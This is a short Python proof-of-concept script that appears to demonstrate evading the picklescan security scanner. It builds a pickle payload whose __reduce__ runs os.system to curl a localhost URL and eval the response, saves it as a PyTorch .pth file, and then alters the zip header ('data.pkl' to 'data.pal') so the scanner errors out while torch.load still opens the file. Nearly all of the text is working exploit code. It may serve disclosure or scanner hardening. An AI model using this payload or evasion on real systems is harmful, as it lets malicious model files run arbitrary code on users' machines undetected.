import os
import torch

class RemoteCodeExecution:
    def __reduce__(self):
        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)


model = RemoteCodeExecution()
zip_file = "does_not_scan_but_opens_in_torch.pth"
torch.save(model, zip_file)

scan(zip_file)

# modify the header to cause the zip file to raise execution in picklescan
print("Modifying the header to cause the zip file to raise exception in picklescan")
with open(zip_file, "rb") as f:
    data = f.read()

# Replace only the first occurrence of "data.pkl" with "data.pal"
modified_data = data.replace(b"data.pkl", b"data.pal", 1)

# Write back the modified content
with open(zip_file, "wb") as f:
    f.write(modified_data)
sleep(5)

print("Header modified!")
sleep(5)

print("Rescanning the file")
scan(zip_file)

sleep(5)
print("calling torch.load")


